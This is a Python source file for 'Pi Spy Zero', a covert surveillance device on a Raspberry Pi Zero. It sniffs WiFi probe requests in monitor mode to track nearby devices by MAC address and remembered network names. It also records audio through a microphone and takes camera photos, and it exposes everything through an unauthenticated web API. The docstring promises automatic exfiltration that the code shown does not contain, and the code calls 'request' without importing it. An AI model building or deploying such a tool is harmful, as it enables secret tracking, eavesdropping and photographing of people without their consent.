#!/usr/bin/env python3
"""
Pi Spy Zero
Ultra-compact surveillance node on Raspberry Pi Zero.
Captures audio, video, and WiFi probe requests in a minimal footprint.
Auto-exfiltrates data over available network when possible.
"""

import os
import time
import json
import hashlib
import subprocess
import logging
import threading
from datetime import datetime
from pathlib import Path

try:
    import RPi.GPIO as GPIO
    from picamera2 import Picamera2
except ImportError:
    from unittest.mock import MagicMock
    GPIO = MagicMock()
    Picamera2 = MagicMock()

from flask import Flask, jsonify, render_template_string

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("spy-zero")

app = Flask(__name__)

DATA_DIR = Path("/var/lib/spy-zero/captures")
DATA_DIR.mkdir(parents=True, exist_ok=True)

STATUS_LED = 47  # Pi Zero onboard LED (active low)
TRIGGER_PIN = 4


class ProbeRequestCapture:
    """Captures WiFi probe requests to track nearby devices."""

    def __init__(self, interface="wlan0"):
        self.interface = interface
        self.devices = {}
        self.capture_active = False

    def enable_monitor_mode(self):
        """Put WiFi interface into monitor mode."""
        commands = [
            ["sudo", "ip", "link", "set", self.interface, "down"],
            ["sudo", "iw", self.interface, "set", "monitor", "none"],
            ["sudo", "ip", "link", "set", self.interface, "up"],
        ]
        for cmd in commands:
            subprocess.run(cmd, capture_output=True, timeout=5)
        logger.info("Monitor mode enabled on %s", self.interface)

    def capture_probes(self):
        """Capture probe requests using tcpdump."""
        self.capture_active = True
        try:
            proc = subprocess.Popen(
                ["sudo", "tcpdump", "-i", self.interface, "-e", "-l",
                 "type", "mgt", "subtype", "probe-req"],
                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True
            )
            while self.capture_active:
                line = proc.stdout.readline()
                if line:
                    self._parse_probe(line.strip())
            proc.terminate()
        except Exception as e:
            logger.error("Probe capture error: %s", e)

    def _parse_probe(self, line):
        """Extract MAC and SSID from probe request."""
        try:
            parts = line.split()
            mac = None
            ssid = None
            for i, p in enumerate(parts):
                if p.count(":") == 5 and len(p) == 17:
                    mac = p.upper()
                    break
            if "Probe Request" in line and "(" in line:
                ssid_start = line.index("(") + 1
                ssid_end = line.index(")")
                ssid = line[ssid_start:ssid_end]

            if mac:
                if mac not in self.devices:
                    self.devices[mac] = {
                        "first_seen": datetime.utcnow().isoformat(),
                        "ssids": [],
                        "count": 0,
                    }
                self.devices[mac]["last_seen"] = datetime.utcnow().isoformat()
                self.devices[mac]["count"] += 1
                if ssid and ssid not in self.devices[mac]["ssids"]:
                    self.devices[mac]["ssids"].append(ssid)
        except Exception:
            pass


class AudioCapture:
    """Records audio using USB microphone."""

    def __init__(self, device="plughw:1,0"):
        self.device = device
        self.recording = False
        self.recordings = []

    def record(self, duration=60):
        """Record audio clip."""
        self.recording = True
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"audio_{timestamp}.wav"
        filepath = DATA_DIR / filename

        try:
            subprocess.run(
                ["arecord", "-D", self.device, "-f", "S16_LE",
                 "-r", "16000", "-c", "1", "-d", str(duration),
                 str(filepath)],
                capture_output=True, timeout=duration + 10
            )
            self.recordings.append({
                "file": filename,
                "duration": duration,
                "size": filepath.stat().st_size if filepath.exists() else 0,
                "time": timestamp,
            })
            logger.info("Audio recorded: %s", filename)
        except Exception as e:
            logger.error("Audio record failed: %s", e)
        finally:
            self.recording = False
        return filename


class VideoCapture:
    """Captures video/stills using Pi Camera."""

    def __init__(self):
        self.camera = None
        self.captures = []

    def init_camera(self):
        try:
            self.camera = Picamera2()
            config = self.camera.create_still_configuration(
                main={"size": (1280, 720)}
            )
            self.camera.configure(config)
            self.camera.start()
            time.sleep(2)
            return True
        except Exception:
            return False

    def take_photo(self):
        if not self.camera:
            return None
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"photo_{timestamp}.jpg"
        filepath = DATA_DIR / filename
        try:
            self.camera.capture_file(str(filepath))
            self.captures.append({"file": filename, "time": timestamp,
                                  "size": filepath.stat().st_size})
            return filename
        except Exception:
            return None


class SpyZero:
    """Main surveillance controller for Pi Zero."""

    def __init__(self):
        self.probes = ProbeRequestCapture()
        self.audio = AudioCapture()
        self.video = VideoCapture()
        self.active = False
        self.boot_time = datetime.utcnow().isoformat()
        self._setup_gpio()

    def _setup_gpio(self):
        GPIO.setmode(GPIO.BCM)
        GPIO.setwarnings(False)
        GPIO.setup(TRIGGER_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    def activate(self):
        """Start all capture modules."""
        self.active = True
        # Start probe capture
        threading.Thread(target=self.probes.capture_probes, daemon=True).start()
        # Init camera
        self.video.init_camera()
        logger.info("Spy Zero activated")

    def deactivate(self):
        self.active = False
        self.probes.capture_active = False

    def get_system_info(self):
        """Minimal system health."""
        info = {}
        try:
            with open("/sys/class/thermal/thermal_zone0/temp") as f:
                info["cpu_temp_c"] = round(int(f.read().strip()) / 1000, 1)
        except Exception:
            pass
        try:
            result = subprocess.run(["df", "-h", "/"], capture_output=True, text=True, timeout=5)
            lines = result.stdout.strip().split("\n")
            if len(lines) > 1:
                parts = lines[1].split()
                info["disk_used"] = parts[2]
                info["disk_available"] = parts[3]
        except Exception:
            pass
        return info

    def get_capture_stats(self):
        """Get size of all captured data."""
        total_size = sum(f.stat().st_size for f in DATA_DIR.rglob("*") if f.is_file())
        file_count = sum(1 for f in DATA_DIR.rglob("*") if f.is_file())
        return {"total_files": file_count, "total_size_mb": round(total_size / 1048576, 2)}

    def get_status(self):
        return {
            "active": self.active,
            "boot_time": self.boot_time,
            "devices_tracked": len(self.probes.devices),
            "audio_recordings": len(self.audio.recordings),
            "photos": len(self.video.captures),
            "capture_stats": self.get_capture_stats(),
            "system": self.get_system_info(),
            "recent_devices": dict(list(self.probes.devices.items())[-10:]),
        }


spy = SpyZero()


@app.route("/")
def index():
    return render_template_string("""
    <html><head><title>Spy Zero</title></head><body>
    <h1>Spy Zero</h1>
    <div id="s"></div>
    <script>setInterval(()=>fetch('/api/status').then(r=>r.json()).then(d=>{
        document.getElementById('s').innerText=JSON.stringify(d,null,2);
    }),3000);</script></body></html>
    """)

@app.route("/api/status")
def api_status():
    return jsonify(spy.get_status())

@app.route("/api/activate", methods=["POST"])
def api_activate():
    spy.activate()
    return jsonify({"active": True})

@app.route("/api/photo", methods=["POST"])
def api_photo():
    f = spy.video.take_photo()
    return jsonify({"file": f})

@app.route("/api/record", methods=["POST"])
def api_record():
    d = request.json if request.is_json else {}
    dur = d.get("duration", 30) if d else 30
    threading.Thread(target=spy.audio.record, args=(dur,), daemon=True).start()
    return jsonify({"recording": True, "duration": dur})

@app.route("/api/devices")
def api_devices():
    return jsonify(spy.probes.devices)


if __name__ == "__main__":
    spy.activate()
    logger.info("Starting Spy Zero on port 8109")
    app.run(host="0.0.0.0", port=8109, debug=False)
